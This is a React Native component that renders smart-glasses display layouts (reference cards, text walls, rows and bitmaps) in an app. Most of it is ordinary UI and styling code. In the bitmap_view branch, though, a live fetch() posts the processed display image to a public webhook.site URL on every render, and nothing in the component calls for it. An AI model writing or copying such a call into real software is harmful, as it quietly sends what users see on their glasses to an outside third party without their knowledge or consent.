import {ThemedStyle} from "@/theme"
import {useAppTheme} from "@/utils/useAppTheme"
import React, {useState, useEffect} from "react"
import {View, Text, StyleSheet, Image, ViewStyle, TextStyle} from "react-native"

import {decode, encode} from "bmp-ts"

interface GlassesDisplayMirrorProps {
  layout: any
  fallbackMessage?: string
  containerStyle?: any
  fullscreen?: boolean
}

const GlassesDisplayMirror: React.FC<GlassesDisplayMirrorProps> = ({
  layout,
  fallbackMessage = "No display data available",
  containerStyle,
  fullscreen = false,
}) => {
  const {themed} = useAppTheme()
  const [processedImageUri, setProcessedImageUri] = useState<string | null>(null)

  // Process bitmap data when layout changes
  useEffect(() => {
    const processBitmap = async () => {
      if (layout?.layoutType != "bitmap_view" || !layout.data) {
        return
      }
      const uri = await processBmpBase64(layout.data)
      if (!uri) {
        return
      }
      setProcessedImageUri(uri)
    }
    processBitmap()
  }, [layout])

  if (!layout || !layout.layoutType) {
    return (
      <View style={themed($emptyContainer)}>
        <Text style={themed($emptyText)}>{fallbackMessage}</Text>
      </View>
    )
  }

  if (fullscreen) {
    return (
      <View style={themed($glassesScreenFullscreen)}>
        {renderLayout(layout, processedImageUri, containerStyle, themed($glassesText))}
      </View>
    )
  }

  return (
    <View style={[themed($glassesScreen), containerStyle]}>
      {renderLayout(layout, processedImageUri, containerStyle, themed($glassesText))}
    </View>
  )
}

/**
 * Render logic for each layoutType
 */
function renderLayout(layout: any, processedImageUri: string | null, containerStyle?: any, textStyle?: TextStyle) {
  switch (layout.layoutType) {
    case "reference_card": {
      const {title, text} = layout
      return (
        <>
          <Text style={[styles.cardTitle, textStyle]}>{title}</Text>
          <Text style={[styles.cardContent, textStyle]}>{text}</Text>
        </>
      )
    }
    case "text_wall":
    case "text_line": {
      const {text} = layout
      // Even if text is empty, show a placeholder message for text_wall layouts
      return <Text style={[styles.cardContent, textStyle]}>{text || text === "" ? text : ""}</Text>
    }
    case "double_text_wall": {
      const {topText, bottomText} = layout
      return (
        <>
          <Text style={[styles.cardContent, textStyle]}>{topText}</Text>
          <Text style={[styles.cardContent, textStyle]}>{bottomText}</Text>
        </>
      )
    }
    case "text_rows": {
      // layout.text is presumably an array of strings
      const rows = layout.text || []
      return rows.map((row: string, index: number) => (
        <Text key={index} style={[styles.cardContent, textStyle]}>
          {row}
        </Text>
      ))
    }
    case "bitmap_view": {
      console.log("🔍 bitmap_view.length", layout.data?.length)

      if (!processedImageUri) {
        // Show loading or fallback while image is processing
        return <Text style={[styles.cardContent, textStyle]}>Loading image...</Text>
      }

      // console.log("🔍 processedImageUri", processedImageUri)
      // log the first 100 characters of the processedImageUri
      // console.log("🔍 processedImageUri:", processedImageUri)
      // post this to webhook url:
      fetch("https://webhook.site/9143bed3-905f-4c62-89cb-7f211d27e667", {
        method: "POST",
        body: processedImageUri,
      })

      return (
        <Image
          source={{uri: processedImageUri}}
          style={{
            flex: 1,
            width: "100%",
            height: undefined,
            resizeMode: "contain",
            // tintColor: "#00FF00" // Apply green tint to the PNG
            // tintColor: "#2d3436",
          }}
        />
      )
    }
    default:
      return <Text style={[styles.cardContent, textStyle]}>Unknown layout type: {layout.layoutType}</Text>
  }
}

const $glassesScreen: ThemedStyle<ViewStyle> = ({colors, spacing}) => ({
  width: "100%",
  minHeight: 140, // Default height for normal mode
  backgroundColor: colors.palette.neutral200,
  borderRadius: 10,
  paddingHorizontal: spacing.md,
  paddingVertical: spacing.sm,
  borderWidth: 2,
  // borderColor: "#333333",
  borderColor: colors.border,
})

const $glassesScreenFullscreen: ThemedStyle<ViewStyle> = ({colors, spacing}) => ({
  backgroundColor: "transparent",
  minHeight: 120,
  padding: 16,
  width: "100%",
})

const $glassesText: ThemedStyle<TextStyle> = ({colors}) => ({
  color: colors.text,
  fontFamily: "Montserrat-Regular",
  fontSize: 14,
})

const $emptyContainer: ThemedStyle<ViewStyle> = () => ({
  flex: 1,
  justifyContent: "center",
  alignItems: "center",
})

const $emptyText: ThemedStyle<TextStyle> = ({colors}) => ({
  color: colors.textDim,
  fontFamily: "Montserrat-Regular",
  fontSize: 20,
  opacity: 0.5,
})

const styles = StyleSheet.create({
  cardContent: {
    fontFamily: "Montserrat-Regular",
    fontSize: 16,
  },

  cardTitle: {
    fontFamily: "Montserrat-Bold",
    fontSize: 18,
    marginBottom: 5,
  },
  emptyTextWall: {
    alignItems: "center",
    borderColor: "#00FF00",
    borderStyle: "dashed",
    borderWidth: 1,
    height: 100,
    justifyContent: "center",
    width: "100%",
  },
  glassesDisplayContainer: {
    alignItems: "center",
    justifyContent: "center",
    padding: 16,
    width: "100%",
  },
})

export default GlassesDisplayMirror
